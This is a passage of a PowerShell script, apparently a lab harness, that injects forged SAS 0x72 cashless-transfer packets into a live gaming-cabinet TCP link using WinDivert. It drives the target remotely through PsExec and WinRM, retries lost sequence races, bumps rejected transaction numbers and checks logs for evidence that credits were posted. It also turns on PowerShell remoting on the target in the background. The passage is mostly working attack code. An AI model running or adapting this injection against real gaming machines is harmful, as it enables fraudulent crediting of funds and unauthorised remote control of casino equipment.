    } else { $null }
    $usedTransport = Invoke-LabRemoteEncodedWithFallback -TransportOrder $transportOrder `
        -Computer $ComputerName -Enc $attemptEnc -LogPath $transportLog -Credential $Credential `
        -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs `
        -WinRmOperationTimeoutMs $winRmTimeoutMs -PsExecTimeoutSec $psexecTimeoutSec
    $swInject.Stop()
    $injectElapsed = $swInject.Elapsed
    if (-not $usedTransport) {
        Write-Host '[!] No transport succeeded for this attempt. Retrying...' -ForegroundColor Yellow
        if ($attemptPollAft -and $sasPollModeEffective -eq 'Auto' -and $pollStrategy.UseComKeeper) {
            Write-Host '[*] Auto fallback: next attempt will use COM poll keeper + WdInject.exe.' -ForegroundColor Yellow
            $usePollAft = $false
        }
        continue
    }

    $lastInjectOut = ''
    $pollAftWaitSec = [Math]::Max($WinDivertEphemWaitSec + $WinDivertPollSeconds + $WinDivertPollDrainSec + 15, 60)
    $waitIters = if ($attemptPollAft) {
        [Math]::Ceiling($pollAftWaitSec / 0.5)
    } else { 8 }
    for ($i = 0; $i -lt $waitIters; $i++) {
        if (Test-Path -LiteralPath $attemptOutUnc) {
            $lastInjectOut = (Get-Content -LiteralPath $attemptOutUnc -Raw)
            if ($lastInjectOut -match 'EXITCODE=|COMPILE_FAILED|REMOTE_EXCEPTION|NO_ESTABLISHED|AFT_INJECTED|DONE mode=pollaft') { break }
        }
        Start-Sleep -Milliseconds $(if ($attemptPollAft) { 500 } else { 150 })
    }
    if ($lastInjectOut) {
        Write-Host "--- $injectLabel output ---" -ForegroundColor DarkGray
        Write-Host $lastInjectOut
    }
    else {
        Write-Host "[!] No output file produced at $attemptOutUnc." -ForegroundColor Yellow
    }

    $openOk = if ($attemptPollAft) { Test-WdPollInjectOpenOk -Output $lastInjectOut } else { Test-WdInjectOpenOk -Output $lastInjectOut }
    $aftSent = if ($attemptPollAft) { Test-WdPollAftInjected -Output $lastInjectOut } else { $lastInjectOut -match 'INJECTED seq=' }

    if ($attemptPollAft -and ((Test-SasBridgePollAftFailed -Output $lastInjectOut) -or (-not $openOk) -or (-not $aftSent))) {
        Write-Host '[!] WinDivert TCP poll+AFT session did not complete cleanly.' -ForegroundColor Yellow
        if ($lastInjectOut -match 'NO_ESTABLISHED') {
            Write-Host '    Poll sim needs CommCtrlSAS:31150 <-> Aurum:<ephemeral> ESTABLISHED.' -ForegroundColor Yellow
        }
        elseif ($lastInjectOut -match 'DONE mode=pollaft.*\bs2c=0\b.*\bc2s=0\b') {
            Write-Host '    Bridge TCP was ESTABLISHED but silent (zero packets).' -ForegroundColor Yellow
        }
        if ($autoWakeEnabled -and -not $autoWakeDone) {
            Invoke-SasBridgeAutoWake -Computer $ComputerName -Credential $Credential -ClearPendingAft -PsExecPath $PsExecPath | Out-Null
            $autoWakeDone = $true
            continue
        }
        if ($attempt -lt $MaxRetries -and $PollAftRetryDelaySec -gt 0) {
            Write-Host "[*] Waiting ${PollAftRetryDelaySec}s for SAS bridge to recover before next attempt..." -ForegroundColor DarkGray
            Start-Sleep -Seconds $PollAftRetryDelaySec
        }
        if ($sasPollModeEffective -eq 'Auto' -and $pollStrategy.UseComKeeper) {
            Write-Host '[*] Auto fallback: starting COM poll keeper and switching to WdInject.exe for next attempt.' -ForegroundColor Cyan
            $usePollAft = $false
            $pollResult = Start-AutoSasPollKeeperIfNeeded -Computer $ComputerName -Port $SasComPort `
            -WarmupSec $SasPollWarmupSec -NoAutoWake:$NoAutoWake
            $pollKeeperProc = $pollResult.Process
            if (-not $pollResult.Ok) {
                Write-Host "    COM fallback failed: $($pollResult.Message)" -ForegroundColor Yellow
            }
            continue
        }
    }

    $driverFailure = Get-WdInjectFatalDriverFailure -Output $lastInjectOut
    if ($driverFailure) {
        $fatalInjectFailure = $driverFailure
        Write-Host "[!] $fatalInjectFailure" -ForegroundColor Red
        break
    }

    # 4e. WinDivert needs an elevated token. If WinRM ran but the driver did not open,
    # retry immediately via PsExec in this same attempt before polling logs.
    if ($usedTransport -eq 'winrm' -and -not $attemptPollAft) {
        $openOk = (Test-WdInjectOpenOk -Output $lastInjectOut) -and ($lastInjectOut -notmatch 'WinDivertOpen FAILED')
        if (-not $openOk) {
            Write-Host '[!] WinRM session could not load WinDivert (no "OPEN ok"); retrying via PsExec now...' -ForegroundColor Yellow
            Remove-Item -LiteralPath $attemptOutUnc -Force -ErrorAction SilentlyContinue
            $transportLog = Join-Path $env:TEMP ("wdinject_psexec_retry_{0}.log" -f $attempt)
            $usedTransport = Invoke-LabRemoteEncodedWithFallback -TransportOrder @('psexec') `
                -Computer $ComputerName -Enc $attemptEnc -LogPath $transportLog -Credential $Credential `
                -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs
            $lastInjectOut = ''
            for ($i = 0; $i -lt 8; $i++) {
                if (Test-Path -LiteralPath $attemptOutUnc) {
                    $lastInjectOut = (Get-Content -LiteralPath $attemptOutUnc -Raw)
                    if ($lastInjectOut -match 'EXITCODE=|COMPILE_FAILED|REMOTE_EXCEPTION') { break }
                }
                Start-Sleep -Milliseconds 150
            }
            if ($lastInjectOut) {
                Write-Host "--- $injectLabel output (PsExec retry) ---" -ForegroundColor DarkGray
                Write-Host $lastInjectOut
            }
            $transportOrder = @('psexec')
        }
    }

    Write-Host '[*] Polling sasmsgr log for ingestion (up to 4s)...' -ForegroundColor Cyan
    $swIngest = [System.Diagnostics.Stopwatch]::StartNew()
    $ingestDeadline = (Get-Date).AddSeconds(4)
    do {
        Start-Sleep -Milliseconds 400
        $ingestLine = Test-SasMessengerIngested -Computer $ComputerName -PacketHex $sasPacketHex -SinceUtc $sendStartUtc
    } while (-not $ingestLine -and (Get-Date) -lt $ingestDeadline)
    $swIngest.Stop()
    $ingestElapsed = $swIngest.Elapsed
    if ($ingestLine) {
        Write-Host '[+] sasmsgr INGESTED the injected 0x72 command:' -ForegroundColor Green
        Write-Host "    $ingestLine" -ForegroundColor Green
        if ($ingestLine -match '^(\S+)') {
            $ingestUtc = Get-LogLineUtc $Matches[1]
        }
        else {
            $ingestUtc = $sendStartUtc
        }
        # Credit events usually post within ~1s; allow longer after post-wake injects.
        $swCredit = [System.Diagnostics.Stopwatch]::StartNew()
        $creditDeadline = (Get-Date).AddSeconds($CreditWaitSec)
        $duplicateRejected = $false
        do {
            Start-Sleep -Milliseconds 500
            $nowUtc = (Get-Date).ToUniversalTime()
            if (Test-AftDuplicateTransactionRejected -Computer $ComputerName -StartUtc $ingestUtc -EndUtc $nowUtc -TxnNumber $TransactionNumber) {
                $duplicateRejected = $true
                break
            }
            $creditEvidence = Find-CreditEvidence -Computer $ComputerName -StartUtc $ingestUtc -EndUtc $ingestUtc.AddSeconds(60) -Amount $AmountCents -TransferType $TransferType
        } while ((@($creditEvidence).Count -eq 0) -and (Get-Date) -lt $creditDeadline)
        $swCredit.Stop()
        $creditElapsed = $swCredit.Elapsed
        if ($duplicateRejected) {
            $oldTxn = $TransactionNumber
            $newTxn = Bump-AftTransactionAfterDuplicate -TransactionNumber ([ref]$TransactionNumber) -Computer $ComputerName `
                -AutoState $autoTransactionState -AutoStatePath $autoTransactionStatePath -AutoNext ([ref]$autoTransactionNext)
            Write-Host ("[!] Aurum rejected duplicate txn id (Test Transaction{0} already in history) - auto-bumped to Test Transaction{1}" -f $oldTxn, $newTxn) -ForegroundColor Yellow
            $payloads = Build-AftInjectEncodedPayloads -TxnNumber $TransactionNumber -SasAddress $SasAddress `
                -CashableAmount $cashableAmt -RestrictedAmount $restrictedAmt -NonRestrictedAmount $nonRestrictedAmt `
                -AssetNumber $AssetNumber -RemoteTemplate $remoteTemplate -RemoteRunPath $remoteRunPath `
                -RemotePollRunPath $remotePollRunPath -BridgePort $BridgePort -ObserveMs $ObserveMs -AckGraceMs $AckGraceMs `
                -WinDivertPollSeconds $WinDivertPollSeconds -WinDivertPollIntervalMs $WinDivertPollIntervalMs `
                -WinDivertPollDrainSec $WinDivertPollDrainSec -WinDivertPollInjectDelayMs $WinDivertPollInjectDelayMs `
                -WinDivertEphemWaitSec $WinDivertEphemWaitSec
            $sasPacketHex = $payloads.SasPacketHex
            $bridgePayloadHex = $payloads.BridgePayloadHex
            $enc = $payloads.Enc
            $encPollAft = $payloads.EncPollAft
            $ingestLine = $null
            $creditEvidence = @()
            if ($attempt -ge $MaxRetries) { break }
            $attempt--
            continue
        }
        if ((@($creditEvidence).Count -gt 0)) {
            break
        }
        if ($NoAutoWake) {
            Write-Host '[!] sasmsgr ingested but no credit evidence  -  -NoAutoWake set; not thrashing bridge. Stopping retries.' -ForegroundColor Yellow
            break
        }
        Write-Host '[!] sasmsgr ingested but no credit evidence  -  retrying with AutoWake + next txn...' -ForegroundColor Yellow
        Write-Host '[*] Credit retry: bridge restart + mapping settle before next inject...' -ForegroundColor Cyan
        Invoke-SasBridgeAutoWake -Computer $ComputerName -Credential $Credential -ClearPendingAft -PsExecPath $PsExecPath | Out-Null
        $autoWakeDone = $true
        $autoWakeDoneRef.Value = $true
        $wakeSinceUtc = (Get-Date).ToUniversalTime()
        $wakeSinceUtcRef.Value = $wakeSinceUtc
        Confirm-AurumInjectReady -Computer $ComputerName -WatTimeoutSec 90 -MappingTimeoutSec 45 `
            -SettleSec $AurumPostWakeSettleSec -SinceUtc $wakeSinceUtc -Context 'credit-retry'
        $resolvedTxn = Resolve-NextFreeAftTransactionNumber -Computer $ComputerName -AfterNumber $TransactionNumber
        if ($resolvedTxn.Skipped.Count -gt 0) {
            Write-Host ("[*] Credit retry skipped burned txn id(s): {0}" -f ($resolvedTxn.Skipped -join ', ')) -ForegroundColor DarkGray
        }
        $TransactionNumber = $resolvedTxn.Number
        if ($autoTransactionStatePath) {
            $autoTransactionNext = Get-NextAftTransactionNumber -Current $TransactionNumber
            Save-AutoAftTransactionState -State $autoTransactionState -Path $autoTransactionStatePath `
                -Computer $ComputerName -NextNumber $autoTransactionNext
        }
        $payloads = Build-AftInjectEncodedPayloads -TxnNumber $TransactionNumber -SasAddress $SasAddress `
            -CashableAmount $cashableAmt -RestrictedAmount $restrictedAmt -NonRestrictedAmount $nonRestrictedAmt `
            -AssetNumber $AssetNumber -RemoteTemplate $remoteTemplate -RemoteRunPath $remoteRunPath `
            -RemotePollRunPath $remotePollRunPath -BridgePort $BridgePort -ObserveMs $ObserveMs -AckGraceMs $AckGraceMs `
            -WinDivertPollSeconds $WinDivertPollSeconds -WinDivertPollIntervalMs $WinDivertPollIntervalMs `
            -WinDivertPollDrainSec $WinDivertPollDrainSec -WinDivertPollInjectDelayMs $WinDivertPollInjectDelayMs `
            -WinDivertEphemWaitSec $WinDivertEphemWaitSec
        $sasPacketHex = $payloads.SasPacketHex
        $bridgePayloadHex = $payloads.BridgePayloadHex
        $enc = $payloads.Enc
        $encPollAft = $payloads.EncPollAft
        Write-Host "[*] Credit retry: Test Transaction$TransactionNumber" -ForegroundColor Cyan
        $ingestLine = $null
        $creditEvidence = @()
        if ($attempt -ge $MaxRetries) { break }
        $attempt--
        continue
    }
    else {
        Write-Host '[!] sasmsgr did not log our 0x72 within window (likely SEQ race). Retrying...' -ForegroundColor Yellow
        if ($attempt -ge $MaxRetries) { break }
        if ($attemptPollAft -and $sasPollModeEffective -eq 'Auto' -and $pollStrategy.UseComKeeper -and -not $pollKeeperProc) {
            Write-Host '[*] Auto fallback: COM poll keeper + WdInject.exe on next attempt.' -ForegroundColor Cyan
            $usePollAft = $false
            $pollResult = Start-AutoSasPollKeeperIfNeeded -Computer $ComputerName -Port $SasComPort `
            -WarmupSec $SasPollWarmupSec -NoAutoWake:$NoAutoWake
            $pollKeeperProc = $pollResult.Process
        }
    }
}

# Now that the injection PsExec is done, kick off the background WinRM enable (if we
# decided to this run). Doing it here -- not earlier -- avoids two PsExec sessions
# fighting over the cabinet's PSEXESVC during the critical inject.
if ($scheduleWinRmEnable) {
    if (Start-LabRemoteWinRmEnableAsync -Computer $ComputerName -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs) {
        Write-Host ''
        Write-Host "[*] Launched background WinRM enable on $ComputerName (Enable-PSRemoting -Force -SkipNetworkProfileCheck). It runs detached; the NEXT run will probe 5985 and prefer WinRM automatically." -ForegroundColor DarkGray
    }
}

$swTotal.Stop()
Write-Host ''
Write-Host '================ TIMING ================' -ForegroundColor White
Write-Host ("  Stage/compile : {0,6:N1}s  ({1})" -f $stageElapsed.TotalSeconds, $(if ($cacheHit) { 'cache hit' } else { 'cache miss (compiled once)' }))
Write-Host ("  Inject (xport): {0,6:N1}s  (via $usedTransport, attempt $attempt)" -f $injectElapsed.TotalSeconds)
Write-Host ("  Ingest wait   : {0,6:N1}s" -f $ingestElapsed.TotalSeconds)
Write-Host ("  Credit wait   : {0,6:N1}s" -f $creditElapsed.TotalSeconds)
Write-Host ("  TOTAL cycle   : {0,6:N1}s  ({1})" -f $swTotal.Elapsed.TotalSeconds, ('{0:mm\:ss\.fff}' -f $swTotal.Elapsed)) -ForegroundColor Cyan
Write-Host ("  Finished at   : {0:yyyy-MM-dd HH:mm:ss}" -f (Get-Date))

Write-Host ''
Write-Host '================ RESULT ================' -ForegroundColor White
if ($ingestLine) {
    Write-Host 'INGESTED : YES' -ForegroundColor Green
    Write-Host "  $ingestLine"
    if (@($creditEvidence).Count -gt 0) {
        Write-Host 'CREDITED : evidence found' -ForegroundColor Green
        foreach ($e in $creditEvidence) { Write-Host "  $e" }
        if ($autoTransactionStatePath) {
            $autoTransactionState | ConvertTo-Json | Set-Content -LiteralPath $autoTransactionStatePath -Encoding UTF8
        }
    }
    else {
        Write-Host 'CREDITED : NO - transfer did not commit (no FINISHED/FULL_TRANSFER_SUCCESSFUL, GM2AU, SlotLog, or txn-event evidence).' -ForegroundColor Red
        $failEnd = $ingestUtc.AddSeconds(45)
        $aftFailures = Find-AftFailureEvidence -Computer $ComputerName -StartUtc $ingestUtc -EndUtc $failEnd -TxnNumber $TransactionNumber
        if ($aftFailures -and $aftFailures.Count -gt 0) {
            Write-Host 'AURUM    : transfer did not complete cleanly (cabinet-side):' -ForegroundColor Yellow
            foreach ($f in $aftFailures) { Write-Host "  $f" -ForegroundColor Yellow }
        }
        else {
            Write-Host 'The packet reached sasmsgr, but Aurum/EGM did not post a matching fresh cashless-in. Common causes: SAS 80/81 polls not active on the link, duplicate transaction id, cashout/handpay during transfer, or amount/type rejected after ingest.' -ForegroundColor Yellow
        }
        exit 3
    }
    exit 0
}
else {
    Write-Host 'INGESTED : NO (TCP write completed but Aurum did not ingest)' -ForegroundColor Red
    if ($fatalInjectFailure) {
        Write-Host $fatalInjectFailure -ForegroundColor Yellow
    }
    elseif ($lastInjectOut -match 'NO_ESTABLISHED') {
        Write-Host 'WinDivert poll sim never started: no ESTABLISHED TCP on 31150 after the wait window. Poll+AFT requires the CommCtrl<->Aurum bridge link; when the cabinet shows mandatory service offline, wait for communications to recover naturally.' -ForegroundColor Yellow
    }
    elseif ($lastInjectOut -match 'TIMEOUT no data packet seen on srcPort') {
        Write-Host "WinDivert opened successfully, but NO outbound segment at all was seen on source port $BridgePort during the ${ObserveMs}ms observe window. ACK-anchoring was attempted (grace ${AckGraceMs}ms), so this means the connection emitted neither payload nor a bare ACK -- it is truly silent (e.g. CommCtrlSAS not running, no established 31150 -> Aurum flow, or a fully idle link with no keepalive/ACK traffic). Restore SAS/COM11 traffic on the cabinet, or raise -ObserveMs, then retry. Verify the live flow with: Get-NetTCPConnection -LocalPort 31100,31150" -ForegroundColor Yellow
    }
    else {
        Write-Host 'Likely SEQ race lost on all attempts, or WinDivert open/inject failed.' -ForegroundColor Yellow
    }
    Write-Host 'Last WdInject.exe output:' -ForegroundColor DarkGray
    Write-Host $lastInjectOut
    exit 2
}
}
finally {
    Stop-SasPollKeeper -Process $pollKeeperProc
}
